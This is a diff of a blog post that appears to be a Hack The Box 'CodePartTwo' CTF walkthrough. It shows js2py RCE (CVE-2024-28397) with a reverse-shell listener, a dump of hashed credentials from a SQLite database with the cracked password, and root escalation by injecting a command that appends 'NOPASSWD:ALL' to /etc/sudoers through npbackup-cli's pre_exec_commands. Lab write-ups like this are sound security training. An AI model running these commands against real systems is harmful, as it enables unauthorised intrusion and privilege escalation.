@@ -8,205 +8,307 @@ layout: post
 
 ![image4.png](/assets/img/CodePartTwo/image%204.png)
 
-# HackTheBox-CodePartTwo[Easy]
+---
+title: HackTheBox
+date: 2026-02-06 12:00:00 +0000
+categories: [HTB, CTF]
+tags: [HTB, CVE, js2py, Linux, Machine]
+layout: post
+---
 
-# Nmap scan
+# Hack The Box 
 
-- First of all scan with nmap .
+## Enumeration
+
+### Nmap Scan
+
+We start with a basic service and version scan using Nmap.
 
 ```bash
 nmap -sV -sC 10.129.11.13
 ```
 
-- Result
+**Result:**
 
-```bash
+```text
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 03:42 EET
-Nmap scan report for 10.129.11.13 (10.129.11.13)
+Nmap scan report for 10.129.11.13
 Host is up (0.065s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
-|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
-|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
 8000/tcp open  http    Gunicorn 20.0.4
-|_http-server-header: gunicorn/20.0.4
-|_http-title: Welcome to CodePartTwo
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds                                                      
+Service Info: OS: Linux
 ```
 
-# Dirbscan
+**Discovered services:**
 
-- Since there is http port we use dirbscan to get directories .
+* SSH on port 22
+* Web application (Gunicorn) on port 8000
+
+---
+
+## Web Enumeration
+
+### Directory Brute Force
+
+Since an HTTP service is available, directory enumeration is performed using `dirsearch`.
 
 ```bash
-dirsearch -u http://10.129.11.13:8000 -x 404 
+dirsearch -u http://10.129.11.13:8000 -x 404
 ```
 
-- Result
+**Result:**
 
-```bash
-Output File: /home/abdelrhman/reports/http_10.129.11.13_8000/_26-01-29_03-46-54.txt
-
-Target: http://10.129.11.13:8000/
-
-[03:46:54] Starting:                                                                                                                                                       
-[03:47:29] 302 -  199B  - /dashboard  ->  /login                            
-[03:47:32] 200 -   10KB - /download                                         
-[03:47:45] 200 -  667B  - /login                                            
-[03:47:46] 302 -  189B  - /logout  ->  /   
+```text
+/dashboard -> /login (302)
+/download  (200)
+/login     (200)
+/logout    -> / (302)
 ```
 
-# Web and getting initial shell
+**Interesting endpoints:**
 
-- After opening web page and registering notice code input area which use `/run_code` endpoint .
+* `/dashboard`
+* `/download`
+* `/run_code` (discovered later during interaction)
 
+---
+
+## Initial Foothold
+
+### Web Application Analysis
+
+After registering and logging in, the dashboard exposes a JavaScript execution panel. Requests are sent to the `/run_code` endpoint.
 ![image3.png](/assets/img/CodePartTwo/image%203.png)
 
+Testing the endpoint:
+
 ```bash
-└─$ curl -X POST http://10.129.11.13:8000/run_code -H "Content-Type: application/json" -d '{"code": "var x = 5 + 5; x"}'
+curl -X POST http://10.129.11.13:8000/run_code \
+-H "Content-Type: application/json" \
+-d '{"code": "var x = 5 + 5; x"}'
+```
+
+**Response:**
+
+```json
 {"result":10}
 ```
-- From home page download source code .
 
-- After searching we found it uses `js2py` at `http://10.129.11.13:8000/run_code` which is vulnerable to https://github.com/naclapor/CVE-2024-28397/.
-- Download then use exploit as described .
+This confirms server-side JavaScript execution.
+
+---
+
+## Source Code Review
+
+The application source code can be downloaded from the `/download` endpoint.
+
+Reviewing the backend reveals that the application uses **js2py** to execute user-supplied JavaScript. This version is vulnerable to **CVE-2024-28397**, allowing remote code execution.
+
+**Reference:**
+
+* [https://github.com/naclapor/CVE-2024-28397](https://github.com/naclapor/CVE-2024-28397)
+
+---
+
+## Exploitation
+
+### Reverse Shell
+
+Set up a listener:
 
 ```bash
-nc -lvnp 8888 
+nc -lvnp 8888
 ```
+
+Run the exploit:
 
 ```bash
-python3 exploit.py --target http://10.129.11.136:8000/run_code --lhost 10.10.14.205 --lport 8888
+python3 exploit.py \
+--target http://10.129.11.13:8000/run_code \
+--lhost 10.10.14.205 \
+--lport 8888
 ```
 
-- Upgrade shell
+A reverse shell is successfully received.
+
+---
+
+## Shell Upgrade
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-# Getting user shell
+---
 
-- After some search we found `users.db`  in instance folder .
+## User Enumeration
 
-![image.png](/assets/img/CodePartTwo/image.png)
+During filesystem enumeration, a SQLite database is discovered:
 
-- Enumerate tables .
-
-```bash
-app@codeparttwo:~/app/instance$ sqlite3 users.db ".tables"
-sqlite3 users.db ".tables"
-code_snippet  user 
+```text
+~/app/instance/users.db
 ```
 
-- Dump users
+### Database Inspection
 
 ```bash
-app@codeparttwo:~/app/instance$ sqlite3 users.db "SELECT * FROM user;"
+sqlite3 users.db ".tables"
+```
+
+```text
+code_snippet  user
+```
+
+Dump user credentials:
+
+```bash
 sqlite3 users.db "SELECT * FROM user;"
+```
+
+```text
 1|marco|649c9d65a206a75f5abe509fe128bce5
 2|app|a97588c0e2fa3a024876339e27aeb42e
 ```
 
-- After cracking .
+After cracking the hash, the following password is obtained:
 
-```bash
+```text
 sweetangelbabylove
 ```
-
 ![image1.png](/assets/img/CodePartTwo/image%201.png)
+---
 
-- Now we can just use them to login using ssh or simply use `su` .
+## SSH Access
+
+Switch user locally or connect via SSH:
 
 ```bash
 su marco
-ssh marco@10.129.11.136
 ```
 
-- Get `user.txt` .
+or
 
 ```bash
-marco@codeparttwo:~$ cat user.txt
+ssh marco@10.129.11.13
+```
+
+Retrieve the user flag:
+
+```bash
 cat user.txt
+```
+
+```text
 a02700fa1e3e8843974152cd435b45d9
 ```
 
-# Getting root
+---
 
-- Run `sudo -l` .
+## Privilege Escalation
 
-```bash
-Matching Defaults entries for marco on codeparttwo:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User marco may run the following commands on codeparttwo:
-    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
-```
-
-- After running this we notice it take config file and path of config file .
+### Sudo Permissions
 
 ```bash
-sudo /usr/local/bin/npbackup-cli  -h
+sudo -l
 ```
 
-- The path is `/home/marco/npbackup.conf`
+```text
+(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+```
+
+The user `marco` can execute `npbackup-cli` as root without a password.
+
+---
+
+## Configuration Abuse
+
+Inspect the help menu:
 
 ```bash
-  -c CONFIG_FILE, --config-file CONFIG_FILE
-                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
+sudo /usr/local/bin/npbackup-cli -h
 ```
 
-- Now we copy config file to /tmp and modify it to get shell
+The tool allows specifying a custom configuration file:
+
+```text
+-c, --config-file CONFIG_FILE
+```
+
+Default configuration file:
+
+```text
+/home/marco/npbackup.conf
+```
+
+Copy it to `/tmp`:
 
 ```bash
 cp ~/npbackup.conf /tmp/mod.conf
 ```
 
-- Open config file notice this in config file which execute commands .
+---
 
-```bash
+## Command Execution as Root
+
+Inside the configuration file:
+
+```yaml
 backup_opts:
   pre_exec_commands: []
 ```
 
-- Since we can run npbackup as root it’s executed command are also root .
-- We add this command to get all privileges inside  `pre_exec_commands: []`.
+This option allows execution of arbitrary commands as root. Modify it to append the user to `/etc/sudoers`:
 
-```bash
-'echo "marco ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
+```yaml
+backup_opts:
+  pre_exec_commands:
+    - 'echo "marco ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
 ```
 
-- This add us to `sudoers` file with all privilege .
-- Run npbackup with modified config .
+---
+
+## Execute Backup
 
 ```bash
- sudo /usr/local/bin/npbackup-cli  -c /tmp/mod.conf  --backup
-
+sudo /usr/local/bin/npbackup-cli -c /tmp/mod.conf -backup
 ```
 
-- Check if it worked and notice `(ALL) NOPASSWD: ALL`
+Verify privileges:
 
 ```bash
-marco@codeparttwo:/tmp$ sudo -l
-Matching Defaults entries for marco on codeparttwo:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User marco may run the following commands on codeparttwo:
-    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
-    (ALL) NOPASSWD: ALL
+sudo -l
 ```
 
-- Now just type `sudo -i` and get flag .
+```text
+(ALL) NOPASSWD: ALL
+```
+
+---
+
+## Root Access
 
 ```bash
-marco@codeparttwo:/tmp$ sudo -i
-root@codeparttwo:~# cat /root/root.txt
+sudo -i
+```
+
+Retrieve the root flag:
+
+```bash
+cat /root/root.txt
+```
+
+```text
 fc15060ea343186abd075822c704159e
 ```
+
+---
+
+## Summary
+
+* **Initial Access:** js2py RCE (CVE-2024-28397)
+* **User Escalation:** SQLite credential reuse
+* **Privilege Escalation:** Misconfigured `npbackup-cli` allowing root command execution
+* **Difficulty:** Easy
+* **Techniques:** RCE, password cracking, sudo abuse, configuration injection
